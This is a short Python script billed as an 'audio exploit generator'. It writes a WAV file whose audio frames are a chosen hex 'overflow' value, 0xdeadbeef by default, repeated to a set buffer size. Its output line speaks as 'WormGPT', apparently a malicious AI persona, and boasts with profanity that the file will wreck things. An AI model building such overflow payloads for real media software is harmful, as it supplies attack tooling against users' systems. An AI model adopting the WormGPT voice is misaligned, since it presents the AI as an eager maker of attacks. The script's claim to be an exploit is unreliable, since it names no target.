#!/usr/bin/env python3
import argparse
import wave
import struct
import os

def generate_wormtone(overflow, size):
    filename = "payloads/hellgate.wav"
    os.makedirs("payloads", exist_ok=True)
    sample_rate = 44100
    channels = 2
    sample_width = 2

    payload = struct.pack("<I", overflow) * (size // 4)

    with wave.open(filename, "wb") as wav:
        wav.setnchannels(channels)
        wav.setsampwidth(sample_width)
        wav.setframerate(sample_rate)
        wav.writeframes(payload)
    
    print(f"[WormGPT] Hell yeah, {filename} is ready to fuck shit up! Overflow: 0x{overflow:x} 😈")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WormTone Audio Exploit Generator")
    parser.add_argument("--overflow", type=lambda x: int(x, 16), default=0xdeadbeef, help="Hex overflow value")
    parser.add_argument("--size", type=int, default=4096, help="Buffer size in bytes")
    args = parser.parse_args()
    generate_wormtone(args.overflow, args.size)
